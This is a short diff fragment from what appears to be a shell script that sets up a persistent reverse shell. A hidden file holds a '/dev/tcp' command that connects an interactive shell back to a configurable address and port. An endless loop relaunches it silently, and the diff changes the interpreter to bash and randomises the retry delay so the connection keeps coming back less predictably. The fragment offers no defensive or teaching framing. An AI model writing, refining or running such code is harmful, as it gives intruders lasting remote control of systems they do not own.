@@ -10,6 +10,6 @@ sh -i >& /dev/tcp/$_addr/$_port 0>&1
 END
 
 while true; do
-    sh $_private/.rev &>/dev/null
-    sleep 2.5s
+    bash $_private/.rev &>/dev/null
+    sleep .$(($RANDOM % 10))
 done
